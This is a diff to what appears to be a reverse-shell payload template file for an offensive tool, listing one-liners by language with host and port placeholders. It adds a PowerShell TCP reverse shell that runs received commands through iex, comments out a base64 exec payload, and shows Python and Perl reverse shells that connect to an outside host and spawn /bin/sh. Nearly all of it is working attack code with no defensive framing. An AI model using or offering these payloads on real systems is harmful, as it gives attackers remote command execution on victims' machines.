@@ -16,8 +16,8 @@ nc:
 
 python:
   # TODO
-  config:
-    base64: exec('$BASE64_PAYLOAD$'.decode('base64'))
+  # config:
+  #   base64: exec('$BASE64_PAYLOAD$'.decode('base64'))
 
   subproc: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$HOST$",$PORT$));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
   pty: python -c 'import socket, os, pty; s=socket.socket(); s.connect(("$HOST$", $PORT$)); [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]; pty.spawn("/bin/sh")'
@@ -28,6 +28,9 @@ ruby:
 
 perl:
   connect: perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($PORT$,inet_aton("$HOST$")))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+powershell:
+  tcpclient: '$client = New-Object System.Net.Sockets.TCPClient("$HOST$",$PORT$);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 
 openssl:
   # catch with 'ncat --ssl'
